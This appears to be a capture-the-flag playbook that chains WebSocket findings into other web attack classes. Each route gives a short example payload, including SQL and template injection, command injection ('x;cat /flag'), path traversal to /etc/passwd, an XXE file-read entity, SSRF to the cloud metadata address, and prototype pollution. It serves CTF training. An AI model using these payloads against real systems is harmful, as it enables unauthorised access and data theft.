# Per route — each flag-route, the path the finding takes

## Route: web-websocket → web-idor — the message-IDOR

```text
the finding:  a frame field names another's object — the per-frame
              scope check is missing
the path:     {"action":"read","id":"<other>"} -> another's object
              -> web-idor's id-space sweep -> the object's flag/secret
              field
the cells:    idor / membership / subscribe — the read-side cells
the flag:     another's object's private field
```

## Route: web-websocket → the flag — the action-dispatch

```text
the finding:  a privileged action reachable with no role check
the path:     {"action":"admin"}/{"action":"flag"}/{"action":"eval"} /
              42["internal",{...}] -> the privileged reply
the cells:    action / self-grant
the flag:     the privileged reply's flag/secret field OR the eval's
              read
```

## Route: web-websocket → web-mass-assignment — the self-grant

```text
the finding:  a role/perm/scope/is_admin field the frame binds
the path:     {"action":"x","role":"admin"} -> the grant -> a privileged
              action -> the flag
the cells:    spoof / action
the flag:     the granted context's privileged reply
```

## Route: web-websocket → web-auth-session — the spoof/the token

```text
the finding:  a from/user_id/sender the server trusts OR a ?token=/
              a forgeable auth
the path:     {"from":"<other>",...} -> acts-as-other -> the other's
              actions OR the token's forge -> a privileged socket
the cells:    spoof / token / binding
the flag:     the other/privileged context's data
```

## Route: web-websocket → web-csrf — the CSWSH chain

```text
the finding:  the four legs — foreign-Origin + cookie-binding +
              SameSite-travels + data-channel
the path:     the attacker page opens the socket as the victim -> the
              victim's data/actions -> the bidirectional read/write
the cells:    origin / binding / samesite
the flag:     the victim's live channel data
```

## Route: web-websocket → web-info-disclosure — the unauth/the URL

```text
the finding:  a 101+data with no credentials OR a ?token= credential
the path:     the open channel -> the dump/read -> the data OR the
              URL's credential -> the leak
the cells:    unauth / token
the flag:     the open channel's data / the leaked credential's use
```

## Route: web-websocket → web-sqli — the injection

```text
the finding:  a q/filter/where/order/id field reaches the SQL query
the path:     {"q":"' UNION SELECT flag--"} -> the rows -> the flag
the cells:    inject
the flag:     the injected rows' flag/secret column
```

## Route: web-websocket → web-ssti — the injection

```text
the finding:  a name/text/tpl/msg/input field reaches the template
the path:     {"name":"{{config.FLAG}}"} -> the rendered flag
the cells:    inject
the flag:     the template's evaluated flag
```

## Route: web-websocket → file-read-primitives — the injection

```text
the finding:  a file/path/doc/name field reaches the filesystem
the path:     {"file":"/flag"}/{"file":"../../etc/passwd"} -> the file
the cells:    inject
the flag:     the file's content
```

## Route: web-websocket → web-command-injection — the injection

```text
the finding:  a host/cmd/exec/target/input field reaches a shell
the path:     {"host":"x;cat /flag"}/{"exec":"cat /flag"} -> the output
the cells:    inject
the flag:     the command output
```

## Route: web-websocket → web-xxe — the injection

```text
the finding:  an xml/data/import/parse/svg field reaches the XML parser
the path:     {"xml":"<!DOCTYPE r[<!ENTITY x SYSTEM 'file:///flag'>]>
              <r>&x;</r>"} -> the entity's data
the cells:    inject
the flag:     the external-entity's file
```

## Route: web-websocket → web-deserialization — the injection

```text
the finding:  a data/obj/session/import/parse field reaches a deserializer
the path:     {"data":"<serialized-gadget>"} -> the gadget chain -> RCE
the cells:    inject
the flag:     the gadget chain's output
```

## Route: web-websocket → web-nosqli — the injection

```text
the finding:  a q/filter/find/id field reaches a document query
the path:     {"q":{"$ne":null}}/{"id":{"$gt":""}} -> the operator
              results
the cells:    inject
the flag:     the operator's returned docs' flag
```

## Route: web-websocket → web-ssrf — the injection

```text
the finding:  a url/fetch/webhook/callback/image/import field reaches
              a server-side fetch
the path:     {"url":"http://169.254.169.254/latest/meta-data/"} ->
              the fetch reply
the cells:    inject
the flag:     the internal/metadata fetch's data
```

## Route: web-websocket → web-prototype-pollution — the injection

```text
the finding:  a __proto__/constructor/prototype/obj/config/set/merge
              field reaches a merge/assign
the path:     {"obj":{"__proto__":{"isAdmin":true}}} -> the polluted
              prototype -> a privileged gate
the cells:    inject
the flag:     the polluted-context's privileged reply
```

## Route: web-websocket → web-graphql — the subscription

```text
the finding:  a {"type":"subscribe",<query>} / a graphql-ws channel
the path:     the subscription's field-IDOR/field-leak/mutation ->
              the pushed data
the cells:    subscribe
the flag:     the subscription's pushed flag/secret
```

## Route: web-websocket → web-logic-flaw — the write-side

```text
the finding:  a transfer/set/broadcast/delete/create/update frame
              changes state
the path:     the write-frame -> a second read -> the state-change ->
              the impact
the cells:    the write-side
the flag:     the changed-state's flag/impact
```

## Route: web-websocket → web-websocket — the resumption

```text
the finding:  a session_id/resume/reconnect/seq/lastEventId resumes a
              stale/foreign context
the path:     the resume -> the old/other context's data
the cells:    resume
the flag:     the resumed context's flag
```

## The route-record

`route: <the finding> -> <the flag-closing class> -> <the path>` — the
finding's class-route + the path it takes.
